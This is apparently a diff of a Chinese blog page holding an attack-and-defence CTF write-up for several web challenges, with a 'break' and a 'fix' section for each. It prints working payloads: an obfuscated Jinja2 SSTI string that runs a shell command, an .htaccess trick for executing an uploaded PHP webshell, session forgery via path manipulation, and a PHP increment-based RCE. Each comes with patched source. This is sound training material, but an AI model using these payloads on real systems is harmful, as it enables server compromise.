@@ -152,16 +152,16 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2023-09-15 18:56:15
+          2023-09-15 21:10:25
         </span>
         
       </div>
       <div class="markdown-body">
         <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezSSTI"><a href="#ezSSTI" class="headerlink" title="ezSSTI"></a>ezSSTI</h3><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p>fuzz测试，黑名单大概为</p>
 <pre class="line-numbers language-none"><code class="language-none">blacklist&#x3D;[&quot;&#39;&quot;,&quot; &quot;,&quot;_&quot;,&quot;+&quot;,&quot;.&quot;,&quot;globals&quot;,&quot;class&quot;,&quot;url_for&quot;,&quot;popen&quot;,&quot;flag&quot;,&quot;attr&quot;,&quot;&#123;&#123;&quot;,&quot;\\x&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>fenjing生成POC即可</p>
 <pre class="line-numbers language-none"><code class="language-none">&#123;%print(((((((lipsum[(lipsum|escape|batch(22)|list|first|last)*2~(&quot;g&quot;&quot;l&quot;&quot;o&quot;&quot;b&quot;&quot;a&quot;&quot;l&quot;&quot;s&quot;)~(lipsum|escape|batch(22)|list|first|last)*2])[(lipsum|escape|batch(22)|list|first|last)*2~(&quot;b&quot;&quot;u&quot;&quot;i&quot;&quot;l&quot;&quot;t&quot;&quot;i&quot;&quot;n&quot;&quot;s&quot;)~(lipsum|escape|batch(22)|list|first|last)*2])[(&quot;e&quot;&quot;v&quot;&quot;a&quot;&quot;l&quot;)])(((&quot;%c&quot;*48)%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,84,104,49,115,95,102,108,97,103,95,49,115,95,104,51,114,101,39,41))))[(&quot;r&quot;&quot;e&quot;&quot;a&quot;&quot;d&quot;)])()))%&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 
 <h4 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h4><p>过滤标识符，直接GG</p>
 <pre class="line-numbers language-none"><code class="language-none">if &quot;&#123;&#123;&quot; in word or &quot;&#123;%&quot; in word:
@@ -184,11 +184,7 @@ def index():
         return t.render()
 
 if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
-    app.run(host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;5000)
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    app.run(host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;5000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>原来的源码</p>
 <pre class="line-numbers language-none"><code class="language-none">from flask import Flask,request
@@ -210,10 +206,9 @@ def index():
 if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
     app.run(host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;5000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><h4 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h4><p>访问指定页面，上传文件<br>经测试可以上传.htaccess文件，</p>
 <pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在上传1.jpg，内容为一句话木马即可</p>
 <h4 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h4><p>黑名单加.htaccess</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -277,7 +272,6 @@ if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
                 <span class="token delimiter important">?></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
 <p>源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -344,11 +338,9 @@ if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
-
 <h3 id="BabyMemo"><a href="#BabyMemo" class="headerlink" title="BabyMemo"></a>BabyMemo</h3><p>我是个猪比，很简单的一题，赛后被tel师傅一提醒我就知道怎么解了，可惜了</p>
-<h4 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h4><p>![[Pasted image 20230915142929.png]]<br>真正的利用点在这，问题是怎么去伪造session，这个需要去看一下session的逻辑，访问后产生的session信息一般会存在php.ini里指定的目录中，文件名为sess_sessid<br>配合这题源码查看，可以将文件上传至tmp目录下，大概就是储存在tmp目录中了，sessid的信息是以序列化流来储存的，可以本地生成一个看看</p>
+<h4 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1694783165185-04110d9b-126f-47f9-830e-f035e4f2bd67.png#averageHue=%23312c2a&clientId=u8293cdfb-eb59-4&from=drop&id=u5ed76961&originHeight=148&originWidth=830&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=26371&status=done&style=none&taskId=u2961f942-7491-4a4d-9ab0-b6689f5964a&title=" alt="Pasted image 20230915142929.png"></p>
+<p>真正的利用点在这，问题是怎么去伪造session，这个需要去看一下session的逻辑，访问后产生的session信息一般会存在php.ini里指定的目录中，文件名为sess_sessid<br>配合这题源码查看，可以将文件上传至tmp目录下，大概就是储存在tmp目录中了，sessid的信息是以序列化流来储存的，可以本地生成一个看看</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php  
 session_start();  
 if (!isset($_SESSION[&#39;username&#39;])) &#123;  
@@ -357,9 +349,10 @@ if (!isset($_SESSION[&#39;username&#39;])) &#123;
 &#125;  
 ?&gt;
 &#x2F;&#x2F;username|s:7:&quot;xianzhi&quot;;admin|b:1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>现在所需要做的就是将这个session数据写入&#x2F;tmp&#x2F;sess_sessid下，并携带着sessid访问即可获得flag</p>
-<p>![[Pasted image 20230915143523.png]]<br>username可控，指定为sess即可</p>
-<p>查看源码发现switch中都存在着拼接文件名后缀的操作，但是在default中，会拼接. 和$compressionMethod，后者可控，但是sessid中只能出现16进制的字符，但是下面存在一个..&#x2F;的置空操作，所以我们可以控制拼接一个.&#x2F;，从而通过while置空<br>![[Pasted image 20230915143745.png]]<br>最后会将$compressedData写入文件中，发现来自于$backupMemos，进行了一次rot13，<br>![[Pasted image 20230915143826.png]]<br>观察源码发现backupMemos也是可控的，那么就将伪造后的session数据进行一次rot13传入写入文件即可<br>![[Pasted image 20230915143905.png]]<br>会通过readfile将文件返回，检查是否写入成功，携带者sess_后的id访问即可get flag</p>
+
+<p>现在所需要做的就是将这个session数据写入&#x2F;tmp&#x2F;sess_sessid下，并携带着sessid访问即可获得flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1694783273693-f32f9551-4a6f-40f4-96a2-4aaebd03adc2.png#averageHue=%23232525&clientId=u8293cdfb-eb59-4&from=drop&id=u7bb87b97&originHeight=222&originWidth=707&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=30394&status=done&style=none&taskId=ube7ec064-26aa-49c3-a751-c49a464ec06&title=" alt="Pasted image 20230915143523.png"></p>
+<p>username可控，指定为sess即可</p>
+<p>查看源码发现switch中都存在着拼接文件名后缀的操作，但是在default中，会拼接. 和$compressionMethod，后者可控，但是sessid中只能出现16进制的字符，但是下面存在一个..&#x2F;的置空操作，所以我们可以控制拼接一个.&#x2F;，从而通过while置空<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1694783316488-ecbace71-dde3-407e-857b-7dfd0cc2fdae.png#averageHue=%23252727&clientId=u8293cdfb-eb59-4&from=drop&id=ua95576d5&originHeight=319&originWidth=652&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=47311&status=done&style=none&taskId=ud7213855-9656-4f13-8ae5-7d5d0645bda&title=" alt="Pasted image 20230915143745.png"><br>最后会将$compressedData写入文件中，发现来自于$backupMemos，进行了一次rot13，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1694783178641-bb2c0fb7-a0a6-4169-8423-b8f08d8e4f58.png#averageHue=%23232525&clientId=u8293cdfb-eb59-4&from=drop&id=ud6a071bf&originHeight=222&originWidth=707&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=30394&status=done&style=none&taskId=u2420b0b7-7aab-4bf1-bb54-74b3a6eb314&title=" alt="Pasted image 20230915143523.png"><br>观察源码发现backupMemos也是可控的，那么就将伪造后的session数据进行一次rot13传入写入文件即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1694783228833-170e30cd-059f-488c-98af-6eeee0cb0e55.png#averageHue=%23232625&clientId=u8293cdfb-eb59-4&from=drop&id=u8b420fa1&originHeight=223&originWidth=828&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36953&status=done&style=none&taskId=ua74880f5-659f-4bdf-bf12-9852cbda81c&title=" alt="Pasted image 20230915143905.png"><br>会通过readfile将文件返回，检查是否写入成功，携带者sess_后的id访问即可get flag</p>
 <h4 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h4><p>index.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -597,7 +590,6 @@ if (!isset($_SESSION[&#39;username&#39;])) &#123;
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
 <p>修复memo.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -763,9 +755,6 @@ if (!isset($_SESSION[&#39;username&#39;])) &#123;
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
-
 <h3 id="fuzee-rce"><a href="#fuzee-rce" class="headerlink" title="fuzee_rce"></a>fuzee_rce</h3><h4 id="break-3"><a href="#break-3" class="headerlink" title="break"></a>break</h4><p>一坨，弱口令登录后就是rce，一个科学计数法绕过+自增RCE，但是比赛的时候不告诉你传参，所以这题0解</p>
 <pre class="line-numbers language-none"><code class="language-none">?w1key&#x3D;1e9
 
@@ -773,7 +762,6 @@ w1key&#x3D;$_&#x3D;(_&#x2F;_._)[0];$β&#x3D;++$_;$Φ&#x3D;_.++$_.$β;$_++;$_++;$
 
 
 &#x2F;&#x2F;$_POST[0]($_POST[_])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
 <h4 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h4><p>先放源码<br>index.php</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
@@ -860,11 +848,7 @@ w1key&#x3D;$_&#x3D;(_&#x2F;_._)[0];$β&#x3D;++$_;$Φ&#x3D;_.++$_.$β;$_++;$_++;$
         &lt;&#x2F;div&gt;
     &lt;&#x2F;div&gt;
 &lt;&#x2F;body&gt;
-&lt;&#x2F;html&gt;
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>nines.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -879,8 +863,7 @@ w1key&#x3D;$_&#x3D;(_&#x2F;_._)[0];$β&#x3D;++$_;$Φ&#x3D;_.++$_.$β;$_++;$_++;$
     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>window.location.replace('./index.php')&lt;/script>"</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 
-<span class="token delimiter important">?></span></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>good.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -901,8 +884,8 @@ w1key&#x3D;$_&#x3D;(_&#x2F;_._)[0];$β&#x3D;++$_;$Φ&#x3D;_.++$_.$β;$_++;$_++;$
     <span class="token function">strCheck</span><span class="token punctuation">(</span><span class="token variable">$w1key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$w1key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>&#96;&#96;</p>
 <p>check.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -919,9 +902,8 @@ w1key&#x3D;$_&#x3D;(_&#x2F;_._)[0];$β&#x3D;++$_;$Φ&#x3D;_.++$_.$β;$_++;$_++;$
     <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>在check中加入$_+.;就把自增ban了</p>
 <p>fix check.php</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
@@ -939,8 +921,6 @@ function strCheck($w1key)
         die(&quot;太长了&quot;);      
       &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 
 <h3 id="Oh-My-PDF"><a href="#Oh-My-PDF" class="headerlink" title="Oh-My-PDF"></a>Oh-My-PDF</h3><h4 id="break-4"><a href="#break-4" class="headerlink" title="break"></a>break</h4><p>一个jwt空密钥攻击，以及一个flask_weasyprint的漏洞，我还没问到具体细节，先放在这了</p>
 <h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for
@@ -1051,9 +1031,7 @@ URL_REGEX <span class="token operator">=</span> re<span class="token punctuation
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
     create_database<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>fix 失败的</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for  
@@ -1189,6 +1167,7 @@ URL_REGEX <span class="token operator">=</span> re<span class="token punctuation
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  
     create_database<span class="token punctuation">(</span>app<span class="token punctuation">)</span>  
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
       </div>
       
         <div class="prev-or-next">
@@ -1203,7 +1182,7 @@ URL_REGEX <span class="token operator">=</span> re<span class="token punctuation
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2023-09-15 18:56:15
+              2023-09-15 21:10:25
             </span>
             
           </div>
